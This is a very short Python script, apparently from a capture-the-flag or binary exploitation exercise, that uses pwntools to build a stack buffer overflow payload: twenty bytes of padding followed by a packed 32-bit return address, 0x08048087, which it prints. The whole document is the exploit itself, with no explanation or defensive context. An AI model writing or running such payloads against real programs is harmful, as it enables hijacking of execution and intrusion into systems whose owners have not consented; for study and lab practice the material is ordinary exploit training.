from pwn import *

padding = b'A'*20
payload = padding + p32(0x08048087)
print(payload)
